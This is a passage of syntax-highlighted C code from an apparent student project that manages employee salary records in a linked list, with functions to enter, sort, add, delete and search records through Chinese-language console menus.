class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;total_num;i++)</span><br><span class="line">&#123;</span><br><span class="line">p=(<span class="keyword">struct</span> person_info*)<span class="built_in">malloc</span>(SIZE);</span><br><span class="line">q-&gt;next=p;</span><br><span class="line">p-&gt;last=q;</span><br><span class="line">q=p;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入第%d名员工的 职工号：&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q-&gt;id);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入第%d名员工的 姓名：&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,q-&gt;name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入第%d名员工的 性别[0-男性，1-女性]：&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q-&gt;sex);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入第%d名员工的 职称：&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,q-&gt;position);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入第%d名员工的 职务工资：&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>,&amp;q-&gt;salary_position);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入第%d名员工的 奖金：&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>,&amp;q-&gt;extra_money);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入第%d名员工的 水电费：&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>,&amp;q-&gt;water_elec_fee);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入第%d名员工的 保险费：&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>,&amp;q-&gt;insur_fee);</span><br><span class="line">q-&gt;salary_total = q-&gt;salary_position + q-&gt;extra_money - q-&gt;water_elec_fee - q-&gt;insur_fee;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;第%d名员工信息录入成功！\n\n&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">q-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;操作成功,成功读入%d名员工信息！！\n\n&quot;</span>,i);</span><br><span class="line"><span class="keyword">return</span>(head);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_data</span><span class="params">(<span class="keyword">struct</span> person_info* p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\n-------------------输出员工信息----------------------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;职工号   姓名     性别         职称       实发工资       \n&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person_info</span> *<span class="title">i</span>;</span></span><br><span class="line"><span class="keyword">for</span>(i=p-&gt;next;i!=<span class="literal">NULL</span>;i=i-&gt;next)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%4d   %6s    %6s    %8s  %10.3f\n&quot;</span>,i-&gt;id,i-&gt;name,(i-&gt;sex==<span class="number">0</span>)?<span class="string">&quot;male&quot;</span>:<span class="string">&quot;female&quot;</span>,i-&gt;position,i-&gt;salary_total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(p-&gt;next==<span class="literal">NULL</span>)<span class="built_in">printf</span>(<span class="string">&quot;NULL&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---------------  员工信息输出完毕--------------------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_data</span><span class="params">(<span class="keyword">struct</span> person_info* p)</span></span><br><span class="line">&#123;</span><br><span class="line">B:<span class="class"><span class="keyword">struct</span> <span class="title">person_info</span>* <span class="title">tmp</span>;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1、按职工号排序\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2、按姓名排序\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3、按工资总额排序\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;4、按职务工资排序\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;5、按奖金排序\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0、返回主菜单\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入您的选择&quot;</span>);</span><br><span class="line"><span class="type">int</span> option_choose;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;option_choose);</span><br><span class="line"><span class="keyword">if</span>(option_choose==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\n\n按职工号排序\n&quot;</span>);</span><br><span class="line">tmp=sortID(p);</span><br><span class="line">print_data(tmp);</span><br><span class="line"><span class="keyword">goto</span> B;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(option_choose==<span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\n\n按工资总额排序\n&quot;</span>);</span><br><span class="line">tmp=sortTOTALSalary(p);</span><br><span class="line">print_data(tmp);</span><br><span class="line"><span class="keyword">goto</span> B;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(option_choose==<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\n\n按职务工资排序\n&quot;</span>);</span><br><span class="line">tmp=sortsalary_position(p);</span><br><span class="line">print_data(tmp);</span><br><span class="line"><span class="keyword">goto</span> B;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(option_choose==<span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\n\n按奖金排序\n&quot;</span>);</span><br><span class="line">tmp=sortextra_money(p);</span><br><span class="line">print_data(tmp);</span><br><span class="line"><span class="keyword">goto</span> B;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func6</span><span class="params">(<span class="keyword">struct</span> person_info* p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\n-------------------计算实发工资----------------------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;职工号   姓名     性别         职称       **实发工资**       \n&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person_info</span> *<span class="title">i</span>;</span></span><br><span class="line"><span class="keyword">for</span>(i=p-&gt;next;i!=<span class="literal">NULL</span>;i=i-&gt;next)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%4d   %6s    %6s    %8s   %10.3f \n&quot;</span>,i-&gt;id,i-&gt;name,(i-&gt;sex==<span class="number">0</span>)?<span class="string">&quot;male&quot;</span>:<span class="string">&quot;female&quot;</span>,i-&gt;position,i-&gt;salary_total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(p-&gt;next==<span class="literal">NULL</span>)<span class="built_in">printf</span>(<span class="string">&quot;NULL&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---------------  实发工资输出完毕--------------------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">sortID</span><span class="params">(<span class="keyword">struct</span> person_info* p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person_info</span> *<span class="title">i</span>,*<span class="title">head</span>,*<span class="title">x</span>,*<span class="title">y</span>;</span></span><br><span class="line"><span class="type">int</span> i1,i2,n;</span><br><span class="line">head=p;</span><br><span class="line"><span class="keyword">for</span>(n=<span class="number">-1</span>;p!=<span class="literal">NULL</span>;p=p-&gt;next,n++);</span><br><span class="line">i1=n;</span><br><span class="line"><span class="keyword">while</span>(i1&gt;<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">i=head;</span><br><span class="line">i2=n-i1;</span><br><span class="line"><span class="keyword">while</span>(i2&lt;n<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i-&gt;next-&gt;next-&gt;id&lt;i-&gt;next-&gt;id)</span><br><span class="line">&#123;</span><br><span class="line">y=i-&gt;next-&gt;next-&gt;next;</span><br><span class="line">x=i-&gt;next;</span><br><span class="line">i-&gt;next=i-&gt;next-&gt;next;</span><br><span class="line">i-&gt;next-&gt;next=x;</span><br><span class="line">x-&gt;next=y;</span><br><span class="line">&#125;</span><br><span class="line">i=i-&gt;next;</span><br><span class="line">i2++;</span><br><span class="line">&#125;</span><br><span class="line">i1--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>(head);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">sortTOTALSalary</span><span class="params">(<span class="keyword">struct</span> person_info* p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person_info</span> *<span class="title">i</span>,*<span class="title">head</span>,*<span class="title">x</span>,*<span class="title">y</span>;</span></span><br><span class="line"><span class="type">int</span> i1,i2,n;</span><br><span class="line">head=p;</span><br><span class="line"><span class="keyword">for</span>(n=<span class="number">-1</span>;p!=<span class="literal">NULL</span>;p=p-&gt;next,n++);</span><br><span class="line">i1=n;</span><br><span class="line"><span class="keyword">while</span>(i1&gt;<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">i=head;</span><br><span class="line">i2=n-i1;</span><br><span class="line"><span class="keyword">while</span>(i2&lt;n<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i-&gt;next-&gt;next-&gt;salary_total&gt;i-&gt;next-&gt;salary_total)</span><br><span class="line">&#123;</span><br><span class="line">y=i-&gt;next-&gt;next-&gt;next;</span><br><span class="line">x=i-&gt;next;</span><br><span class="line">i-&gt;next=i-&gt;next-&gt;next;</span><br><span class="line">i-&gt;next-&gt;next=x;</span><br><span class="line">x-&gt;next=y;</span><br><span class="line">&#125;</span><br><span class="line">i=i-&gt;next;</span><br><span class="line">i2++;</span><br><span class="line">&#125;</span><br><span class="line">i1--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>(head);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">sortsalary_position</span><span class="params">(<span class="keyword">struct</span> person_info* p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person_info</span> *<span class="title">i</span>,*<span class="title">head</span>,*<span class="title">x</span>,*<span class="title">y</span>;</span></span><br><span class="line"><span class="type">int</span> i1,i2,n;</span><br><span class="line">head=p;</span><br><span class="line"><span class="keyword">for</span>(n=<span class="number">-1</span>;p!=<span class="literal">NULL</span>;p=p-&gt;next,n++);</span><br><span class="line">i1=n;</span><br><span class="line"><span class="keyword">while</span>(i1&gt;<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">i=head;</span><br><span class="line">i2=n-i1;</span><br><span class="line"><span class="keyword">while</span>(i2&lt;n<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i-&gt;next-&gt;next-&gt;salary_position&gt;i-&gt;next-&gt;salary_position)</span><br><span class="line">&#123;</span><br><span class="line">y=i-&gt;next-&gt;next-&gt;next;</span><br><span class="line">x=i-&gt;next;</span><br><span class="line">i-&gt;next=i-&gt;next-&gt;next;</span><br><span class="line">i-&gt;next-&gt;next=x;</span><br><span class="line">x-&gt;next=y;</span><br><span class="line">&#125;</span><br><span class="line">i=i-&gt;next;</span><br><span class="line">i2++;</span><br><span class="line">&#125;</span><br><span class="line">i1--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>(head);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">sortextra_money</span><span class="params">(<span class="keyword">struct</span> person_info* p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person_info</span> *<span class="title">i</span>,*<span class="title">head</span>,*<span class="title">x</span>,*<span class="title">y</span>;</span></span><br><span class="line"><span class="type">int</span> i1,i2,n;</span><br><span class="line">head=p;</span><br><span class="line"><span class="keyword">for</span>(n=<span class="number">-1</span>;p!=<span class="literal">NULL</span>;p=p-&gt;next,n++);</span><br><span class="line">i1=n;</span><br><span class="line"><span class="keyword">while</span>(i1&gt;<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">i=head;</span><br><span class="line">i2=n-i1;</span><br><span class="line"><span class="keyword">while</span>(i2&lt;n<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i-&gt;next-&gt;next-&gt;extra_money&gt;i-&gt;next-&gt;extra_money)</span><br><span class="line">&#123;</span><br><span class="line">y=i-&gt;next-&gt;next-&gt;next;</span><br><span class="line">x=i-&gt;next;</span><br><span class="line">i-&gt;next=i-&gt;next-&gt;next;</span><br><span class="line">i-&gt;next-&gt;next=x;</span><br><span class="line">x-&gt;next=y;</span><br><span class="line">&#125;</span><br><span class="line">i=i-&gt;next;</span><br><span class="line">i2++;</span><br><span class="line">&#125;</span><br><span class="line">i1--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>(head);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">add</span><span class="params">(<span class="keyword">struct</span> person_info* p,<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person_info</span> *<span class="title">head</span>,*<span class="title">q</span>;</span></span><br><span class="line">head=p;</span><br><span class="line"><span class="keyword">for</span>(;p-&gt;next!=<span class="literal">NULL</span>;p=p-&gt;next);<span class="comment">//遍历 ，直到最后一个尾结点 </span></span><br><span class="line">q=p,p=p-&gt;next;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">p=(<span class="keyword">struct</span> person_info*)<span class="built_in">malloc</span>(SIZE);</span><br><span class="line">q-&gt;next=p;</span><br><span class="line">p-&gt;last=q;</span><br><span class="line">q=p;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入第%d名员工的 职工号：&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q-&gt;id);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入第%d名员工的 姓名：&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,q-&gt;name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入第%d名员工的 性别[0-男性，1-女性]：&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q-&gt;sex);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入第%d名员工的 职称：&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,q-&gt;position);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入第%d名员工的 职务工资：&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>,&amp;q-&gt;salary_position);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入第%d名员工的 奖金：&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>,&amp;q-&gt;extra_money);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入第%d名员工的 水电费：&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>,&amp;q-&gt;water_elec_fee);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入第%d名员工的 保险费：&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>,&amp;q-&gt;insur_fee);</span><br><span class="line">q-&gt;salary_total = q-&gt;salary_position + q-&gt;extra_money - q-&gt;water_elec_fee - q-&gt;insur_fee;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;第%d名员工信息录入成功！\n\n&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">q-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span>(head);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">delete_main</span><span class="params">(<span class="keyword">struct</span> person_info* p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n----------提示：可以根据职工号或姓名删除数据----------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1.根据职工号删除数据\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2.根据姓名删除数据\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3.返回主菜单\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------\n&quot;</span>);</span><br><span class="line"><span class="type">int</span> func4_choose;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请选择功能对应的序号:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;func4_choose);</span><br><span class="line"><span class="keyword">if</span>(func4_choose == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> id_input;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入要删除的职工号:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;id_input);</span><br><span class="line">p=delete_id(p,id_input);</span><br><span class="line">print_data(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(func4_choose == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> de_name[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入要删除的姓名:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,de_name);</span><br><span class="line">p=delete_name(p,de_name);</span><br><span class="line">print_data(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">delete_id</span><span class="params">(<span class="keyword">struct</span> person_info* p,<span class="type">int</span> id)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person_info</span> *<span class="title">b</span>,*<span class="title">c</span>,*<span class="title">head</span>;</span></span><br><span class="line">head=c=p;</span><br><span class="line">b=head-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(b!=<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(b-&gt;id== id)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;确认删除 id 为 [%d] 姓名 为 [%s] 的数据？【删除请输入1，取消此操作请输入0】 &quot;</span>,id,b-&gt;name);</span><br><span class="line"><span class="type">int</span> check1;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;check1);</span><br><span class="line"><span class="keyword">if</span>(check1==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">c-&gt;next=b-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;操作成功\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(check1==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;终止操作\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> c=b;</span><br><span class="line">b=c-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>(head);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">delete_name</span><span class="params">(<span class="keyword">struct</span> person_info* p,<span class="type">char</span> name[<span class="number">100</span>])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person_info</span> *<span class="title">b</span>,*<span class="title">c</span>,*<span class="title">head</span>;</span></span><br><span class="line">head=c=p;</span><br><span class="line">b=head-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(b!=<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(name,b-&gt;name) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;确认删除 id 为 [%d] 姓名 为 [%s] 的数据？【删除请输入1，取消此操作请输入0】 &quot;</span>,b-&gt;id,b-&gt;name);</span><br><span class="line"><span class="type">int</span> check1;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;check1);</span><br><span class="line"><span class="keyword">if</span>(check1==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">c-&gt;next=b-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;操作成功\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(check1==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;终止操作\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> c=b;</span><br><span class="line">b=c-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>(head);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">find_main</span><span class="params">(<span class="keyword">struct</span> person_info* p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//当选择查询功能时，用户可以按某种方式查询，如按职工号或姓名查询、按职称查询等；用户也可以查询某一范围内的数据，</span></span><br><span class="line"><span class="comment">//如工资总额小于2000元的职工的数据，介于1000～2000元的职工的数据等，根据具体要求列出菜单供用户选择。</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n----------提示：可以根据职工号、姓名、职称查询数据------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1.根据职工号查询数据\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2.根据姓名查询数据\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3.根据职称查询数据\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;4.返回主菜单\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------\n&quot;</span>);</span><br><span class="line"><span class="type">int</span> func5_choose;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请选择功能对应的序号:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;func5_choose);</span><br><span class="line"><span class="keyword">if</span>(func5_choose==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> id_ch;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入要查询的职工号:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;id_ch);</span><br><span class="line">find_id(p,id_ch);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(func5_choose==<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> ch_name[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入要查询的姓名:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,ch_name);</span><br><span class="line">find_name(p,ch_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(func5_choose==<span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> ch_posi[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入要查询的职称:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,ch_posi);</span><br><span class="line">find_posi(p,ch_posi);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">find_id</span><span class="params">(<span class="keyword">struct</span> person_info* p,<span class="type">int</span> id)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person_info</span> *<span class="title">b</span>,*<span class="title">c</span>,*<span class="title">head</span>;</span></span><br><span class="line"><span class="type">bool</span> find=<span class="literal">false</span>;</span><br><span class="line">head=c=p;</span><br><span class="line">b=head-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(b!=<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(b-&gt;id== id)</span><br><span class="line">&#123;</span><br><span class="line">find=<span class="literal">true</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到 id 为 [%d] 姓名 为 [%s] 的数据\n\n&quot;</span>,id,b-&gt;name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;职工号   姓名     性别         职称       **实发工资**       \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%4d   %6s    %6s    %8s   %10.3f \n&quot;</span>,b-&gt;id,b-&gt;name,(b-&gt;sex==<span class="number">0</span>)?<span class="string">&quot;male&quot;</span>:<span class="string">&quot;female&quot;</span>,b-&gt;position,b-&gt;salary_total);</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> c=b;</span><br><span class="line">b=c-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!find) <span class="built_in">printf</span>(<span class="string">&quot;没有找到 id 为 %d 的数据\n\n&quot;</span>,id);</span><br><span class="line"><span class="keyword">return</span>(head);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> person_info* <span class="title function_">find_name</span><span class="params">(<span class="keyword">struct</span> person_info* p,<span class="type">char</span> name1[<span class="number">100</span>])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person_info</span> *<span class="title">b</span>,*<span class="title">c</span>,*<span class="title">head</span>;</span></span><br><span class="line"><span class="type">bool</span> find=<span class="literal">false</span>;</span><br><span class="line">head=c=p;</span><br><span class="line">b=head-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(b!=<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(name1,b-&gt;name) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">find=<span class="literal">true</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到 id 为 [%d] 姓名 为 [%s] 的数据\n\n&quot;</span>,b-&gt;id,b-&gt;name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;职工号   姓名     性别         职称       **实发工资**       \n&quot;</span>);</span><br><span class="line"><span 